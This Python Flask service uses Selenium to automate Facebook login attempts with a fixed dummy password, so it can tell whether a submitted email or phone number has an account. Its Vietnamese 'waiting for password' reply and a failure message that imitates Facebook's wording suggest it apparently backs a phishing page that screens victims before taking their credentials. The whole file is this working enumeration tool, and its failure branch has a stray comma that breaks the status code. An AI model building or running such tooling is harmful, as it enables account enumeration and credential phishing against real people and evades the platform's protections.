from selenium import webdriver
from selenium.webdriver.chrome.service import Service as ChromeService
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from flask import Flask, request, jsonify
import time

app = Flask(__name__)

url = "https://www.facebook.com/login"

def create_headless_driver():
    chrome_options = Options()
    chrome_options.add_argument("--no-sandbox");
    #chrome_options.add_argument("--headless");
    chrome_options.add_argument("--disable-dev-shm-usage"); 
    chrome_options.add_argument("--window-size=1920x1080");

    driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()), options=chrome_options)
    return driver

def login_to_facebook(email, password, param):
    driver = create_headless_driver()
    driver.get(url)

    email_element = driver.find_element("id", "email")
    email_element.send_keys(email)
    
    password_element = driver.find_element("id", "pass")
    password_element.send_keys(password)
    
    time.sleep(0.3)
    password_element.send_keys(Keys.RETURN)
    time.sleep(5)

    is_login_successful = param not in driver.current_url
    driver.quit()
    
    return is_login_successful

def email_exists(email, password):
    param = "login_attempt"
    return login_to_facebook(email, password, param)

@app.route('/check-email', methods=['POST'])
def check_email():
    data = request.get_json()
    email = data.get('email')
    default_password = "123456789"
    
    if email_exists(email, default_password):
        return jsonify({
            "message": "Email và sđt có liên kết facebook, chờ nhập pass...", 
            "status": 200, 
            "email": email
            }), 200
    else:
        return jsonify({
            "message": "The mobile number you entered is not connected to any account. Find your account and log in.", 
            "status": 400}),
        400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5003)